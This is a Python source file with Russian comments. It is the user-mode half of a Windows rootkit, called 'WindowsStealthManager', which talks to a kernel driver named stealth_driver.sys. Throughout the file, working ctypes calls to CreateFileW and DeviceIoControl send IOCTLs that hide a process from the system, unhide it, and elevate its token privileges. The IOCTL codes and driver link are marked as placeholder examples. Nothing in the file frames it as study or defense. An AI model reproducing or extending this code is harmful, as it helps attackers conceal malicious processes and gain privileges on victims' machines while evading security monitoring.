# Python user-mode компонент для взаимодействия с stealth_driver.sys

import platform
import logging
import ctypes
from typing import Optional, Tuple

from .interface import StealthInterface

logger = logging.getLogger('WindowsStealth')

# TODO: Определить реальные IOCTL коды (должны совпадать с драйвером)
IOCTL_HIDE_PROCESS = 0x80002001 # Пример
IOCTL_UNHIDE_PROCESS = 0x80002002 # Пример
IOCTL_ELEVATE_PROCESS = 0x80002003 # Пример

# TODO: Определить имя символической ссылки драйвера
DRIVER_SYMBOLIC_LINK = r"\\.\StealthDriver" # Пример

class WindowsStealthManager(StealthInterface):

    def __init__(self):
        if platform.system() != "Windows":
            raise OSError("WindowsStealthManager requires Windows OS.")
        self.driver_handle = None
        self._connect_driver()

    def _connect_driver(self):
        """Пытается получить хендл драйвера."""
        try:
            # GENERIC_READ | GENERIC_WRITE = 0xC0000000
            # FILE_SHARE_READ | FILE_SHARE_WRITE = 0x00000003
            # OPEN_EXISTING = 3
            create_file = ctypes.windll.kernel32.CreateFileW
            create_file.argtypes = [ctypes.c_wchar_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p]
            create_file.restype = ctypes.c_void_p # HANDLE

            self.driver_handle = create_file(
                DRIVER_SYMBOLIC_LINK, # lpFileName
                0xC0000000,          # dwDesiredAccess (GENERIC_READ | GENERIC_WRITE)
                0x00000003,          # dwShareMode (FILE_SHARE_READ | FILE_SHARE_WRITE)
                None,                # lpSecurityAttributes
                3,                   # dwCreationDisposition (OPEN_EXISTING)
                0,                   # dwFlagsAndAttributes
                None                 # hTemplateFile
            )

            INVALID_HANDLE_VALUE = -1 # ctypes.c_void_p(-1).value не работает как ожидалось
            if not self.driver_handle or self.driver_handle == INVALID_HANDLE_VALUE:
                error_code = ctypes.windll.kernel32.GetLastError()
                self.driver_handle = None
                logger.error(f"Failed to connect to driver {DRIVER_SYMBOLIC_LINK}. Error code: {error_code}. Is the driver loaded?")
            else:
                logger.info(f"Successfully connected to driver {DRIVER_SYMBOLIC_LINK}. Handle: {self.driver_handle}")

        except Exception as e:
            logger.error(f"Exception connecting to driver: {e}", exc_info=True)
            self.driver_handle = None

    def _send_ioctl(self, ioctl_code: int, input_data: Optional[bytes] = None) -> Tuple[bool, Optional[bytes], str]:
        """Отправляет IOCTL драйверу."""
        if not self.driver_handle:
            # Пытаемся переподключиться
            self._connect_driver()
            if not self.driver_handle:
                return False, None, "Driver not connected."

        device_io_control = ctypes.windll.kernel32.DeviceIoControl
        device_io_control.argtypes = [
            ctypes.c_void_p,    # hDevice
            ctypes.c_uint32,   # dwIoControlCode
            ctypes.c_void_p,    # lpInBuffer
            ctypes.c_uint32,   # nInBufferSize
            ctypes.c_void_p,    # lpOutBuffer
            ctypes.c_uint32,   # nOutBufferSize
            ctypes.POINTER(ctypes.c_uint32), # lpBytesReturned
            ctypes.c_void_p     # lpOverlapped
        ]
        device_io_control.restype = ctypes.c_bool

        in_buffer = input_data if input_data else None
        in_buffer_size = len(input_data) if input_data else 0
        # TODO: Определить ожидаемый размер выходного буфера, если он нужен
        out_buffer_size = 0
        out_buffer = None
        bytes_returned = ctypes.c_uint32(0)

        try:
            success = device_io_control(
                self.driver_handle,
                ioctl_code,
                in_buffer,
                in_buffer_size,
                out_buffer,
                out_buffer_size,
                ctypes.byref(bytes_returned),
                None
            )

            if success:
                return True, out_buffer, "IOCTL sent successfully."
            else:
                error_code = ctypes.windll.kernel32.GetLastError()
                # TODO: Преобразовать код ошибки в сообщение
                msg = f"DeviceIoControl failed with error code: {error_code}"
                logger.error(msg)
                return False, None, msg
        except Exception as e:
            msg = f"Exception sending IOCTL 0x{ioctl_code:X}: {e}"
            logger.error(msg, exc_info=True)
            return False, None, msg

    def hide_process(self, process_id: int) -> Tuple[bool, str]:
        pid_bytes = process_id.to_bytes(4, 'little') # Передаем PID как 4 байта
        success, _, msg = self._send_ioctl(IOCTL_HIDE_PROCESS, pid_bytes)
        return success, msg

    def unhide_process(self, process_id: int) -> Tuple[bool, str]:
        pid_bytes = process_id.to_bytes(4, 'little')
        success, _, msg = self._send_ioctl(IOCTL_UNHIDE_PROCESS, pid_bytes)
        return success, msg

    def elevate_process_token(self, process_id: int) -> Tuple[bool, str]:
        pid_bytes = process_id.to_bytes(4, 'little')
        success, _, msg = self._send_ioctl(IOCTL_ELEVATE_PROCESS, pid_bytes)
        return success, msg

    def __del__(self):
        # Закрываем хендл при удалении объекта
        if self.driver_handle:
            try:
                close_handle = ctypes.windll.kernel32.CloseHandle
                close_handle.argtypes = [ctypes.c_void_p]
                close_handle.restype = ctypes.c_bool
                closed = close_handle(self.driver_handle)
                if closed:
                    logger.info("Driver handle closed.")
                else:
                    logger.warning("Failed to close driver handle.")
            except Exception as e:
                logger.error(f"Exception closing driver handle: {e}") 